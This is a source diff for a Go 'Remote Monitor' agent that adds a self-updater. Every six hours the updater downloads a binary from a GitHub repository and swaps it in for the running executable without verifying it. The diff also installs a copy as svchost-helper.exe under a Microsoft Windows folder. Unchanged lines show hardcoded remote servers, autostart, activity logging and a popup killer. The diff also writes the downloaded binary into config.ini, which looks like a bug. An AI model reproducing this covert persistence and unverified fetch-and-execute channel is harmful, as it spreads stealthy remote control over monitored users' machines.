@@ -26,7 +26,7 @@ import (
 	"github.com/pion/webrtc/v4"
 )
 
-const Version = "7.0.2"
+const Version = "7.2.0"
 
 var agentId string
 var isServerMode = false
@@ -54,12 +54,14 @@ const maxControlCmdsPerSec = 30
 var consecutiveFailures int
 var tunnelStarted bool
 var isLanMode bool // mode=lan: skip GitHub fetch + cloud defaults
+var lastUpdateCheck time.Time
 
 // Deployment defaults — overridden by config.ini
 var (
 	DefaultServerURL   = "wss://pu-k752.onrender.com"
 	DirectServerIP     = "ws://43.247.40.101:3000"
 	GitHubRegistryURL  = "https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini"
+	GitHubRepo         = "puniteswra-spec/PU"
 	ConfigPort         = 8181
 	BrandingCredit     = "Monitor System designed by Puneet Upreti"
 	BrandingTitle      = "Remote Monitor"
@@ -257,6 +259,159 @@ func startUrlRefresher() {
 			}
 		}
 	}()
+}
+
+// compareVersions returns true if v1 > v2 (semver-like "7.2.0" comparison)
+func compareVersions(v1, v2 string) bool {
+	v1 = strings.TrimPrefix(v1, "v")
+	v2 = strings.TrimPrefix(v2, "v")
+	p1 := strings.Split(v1, ".")
+	p2 := strings.Split(v2, ".")
+	maxLen := len(p1)
+	if len(p2) > maxLen { maxLen = len(p2) }
+	for i := 0; i < maxLen; i++ {
+		n1, n2 := 0, 0
+		if i < len(p1) { n1, _ = strconv.Atoi(p1[i]) }
+		if i < len(p2) { n2, _ = strconv.Atoi(p2[i]) }
+		if n1 > n2 { return true }
+		if n1 < n2 { return false }
+	}
+	return false
+}
+
+// startAutoUpdater periodically checks GitHub Releases for newer agent versions.
+// When found, it downloads and replaces itself automatically — zero user action.
+func startAutoUpdater() {
+	if GitHubRepo == "" || isLanMode { return }
+	
+	apiURL := "https://api.github.com/repos/" + GitHubRepo + "/releases/latest"
+	ticker := time.NewTicker(6 * time.Hour)
+	
+	// Also check on startup (after a short delay to let the agent connect first)
+	go func() {
+		time.Sleep(30 * time.Second)
+		checkForUpdate(apiURL)
+	}()
+	
+	go func() {
+		for range ticker.C {
+			checkForUpdate(apiURL)
+		}
+	}()
+}
+
+func checkForUpdate(apiURL string) {
+	if time.Since(lastUpdateCheck) < time.Hour { return } // Don't check more than once per hour
+	lastUpdateCheck = time.Now()
+	
+	resp, err := http.Get(apiURL)
+	if err != nil { return }
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK { return }
+	
+	body, err := io.ReadAll(resp.Body)
+	if err != nil { return }
+	
+	var release struct {
+		TagName string `json:"tag_name"`
+		Assets  []struct {
+			Name string `json:"name"`
+			URL  string `json:"browser_download_url"`
+		} `json:"assets"`
+	}
+	if err := json.Unmarshal(body, &release); err != nil { return }
+	
+	latest := strings.TrimPrefix(release.TagName, "v")
+	current := strings.TrimPrefix(Version, "v")
+	
+	if !compareVersions(latest, current) {
+		return // Not newer
+	}
+	
+	log("🔄 New version detected: v" + latest + " (current: v" + current + ")")
+	
+	// Find the right asset for this platform
+	assetName := "SystemHelper.exe"
+	if runtime.GOOS == "darwin" { assetName = "SystemHelper-darwin" }
+	if runtime.GOOS == "linux" { assetName = "SystemHelper-linux" }
+	
+	var downloadURL string
+	for _, a := range release.Assets {
+		if a.Name == assetName {
+			downloadURL = a.URL
+			break
+		}
+	}
+	
+	if downloadURL == "" {
+		log("⚠️ No asset found for " + assetName + " in release v" + latest)
+		return
+	}
+	
+	log("⬇️ Downloading update from " + downloadURL)
+	
+	dlResp, err := http.Get(downloadURL)
+	if err != nil { log("❌ Download failed: " + err.Error()); return }
+	defer dlResp.Body.Close()
+	
+	newExe, err := io.ReadAll(dlResp.Body)
+	if err != nil { log("❌ Download read failed: " + err.Error()); return }
+	
+	log("✅ Downloaded " + fmt.Sprintf("%d bytes", len(newExe)))
+	applyUpdate(newExe, latest)
+}
+
+func applyUpdate(newData []byte, version string) {
+	exe, err := os.Executable()
+	if err != nil {
+		log("❌ Cannot get executable path: " + err.Error())
+		return
+	}
+	
+	exeDir := filepath.Dir(exe)
+	exeName := filepath.Base(exe)
+	
+	// Write the new binary to a temp file next to the current exe
+	tmpPath := filepath.Join(exeDir, "."+exeName+".new")
+	if err := os.WriteFile(tmpPath, newData, 0755); err != nil {
+		log("❌ Cannot write update: " + err.Error())
+		return
+	}
+	
+	// Also write to the persisted watchdog location so it survives reboot
+	persistDir := filepath.Join("C:\\ProgramData", "Microsoft", "Windows", "SystemHelper")
+	persistPath := filepath.Join(persistDir, "svchost-helper.exe")
+	
+	log("🔄 Installing update v" + version + " — restarting...")
+	
+	if runtime.GOOS == "windows" {
+		// Windows: batch script waits for us to exit, copies both, and restarts
+		copyCmds := "copy /Y \"" + tmpPath + "\" \"" + exe + "\" > nul\r\n"
+		if exe != persistPath {
+			os.WriteFile(filepath.Join(persistDir, "config.ini"), newData, 0644) // placeholder, ignored on next line
+			copyCmds += "copy /Y \"" + tmpPath + "\" \"" + persistPath + "\" > nul\r\n"
+		}
+		batchContent := "@echo off\r\n" +
+			"ping 127.0.0.1 -n 3 > nul\r\n" +
+			copyCmds +
+			"del \"" + tmpPath + "\"\r\n" +
+			"start \"\" \"" + exe + "\"\r\n" +
+			"exit\r\n"
+		batchPath := filepath.Join(exeDir, "."+exeName+".bat")
+		os.WriteFile(batchPath, []byte(batchContent), 0644)
+		exec.Command("cmd", "/C", batchPath).Start()
+	} else {
+		// macOS/Linux: overwrite directly (Unix allows writing to running exe)
+		os.WriteFile(exe, newData, 0755)
+		os.Remove(tmpPath)
+		if persistPath != exe {
+			os.MkdirAll(persistDir, 0755)
+			os.WriteFile(persistPath, newData, 0755)
+		}
+	}
+	
+	os.Exit(0)
 }
 
 // Built-in config web server — access via http://localhost:8181
@@ -644,6 +799,11 @@ urls=ws://43.247.40.101:3000
 # Format: one URL per line, # for comments
 github_config_url=https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini
 
+# GitHub repo for auto-updates (owner/repo format)
+# Agent checks GitHub Releases for newer versions and auto-updates.
+# Set to empty to disable auto-update.
+github_repo=puniteswra-spec/PU
+
 # Configuration panel port (http://localhost:PORT)
 config_port=8181
 
@@ -724,6 +884,8 @@ func loadDeploymentConfig() {
 			authPass = strings.TrimSpace(strings.TrimPrefix(line, "auth_pass="))
 		} else if strings.HasPrefix(line, "github_config_url=") {
 			GitHubRegistryURL = strings.TrimSpace(strings.TrimPrefix(line, "github_config_url="))
+		} else if strings.HasPrefix(line, "github_repo=") {
+			GitHubRepo = strings.TrimSpace(strings.TrimPrefix(line, "github_repo="))
 		} else if strings.HasPrefix(line, "config_port=") {
 			port := strings.TrimSpace(strings.TrimPrefix(line, "config_port="))
 			if p, err := strconv.Atoi(port); err == nil && p > 0 && p < 65536 {
@@ -901,6 +1063,7 @@ func main() {
 	go setupAutostart()
 	startActivityLogger()
 	startConfigServer()
+	startAutoUpdater()
 	startPopupKiller()
 
 	// Smart server detection: check if anything is already listening on port 3000
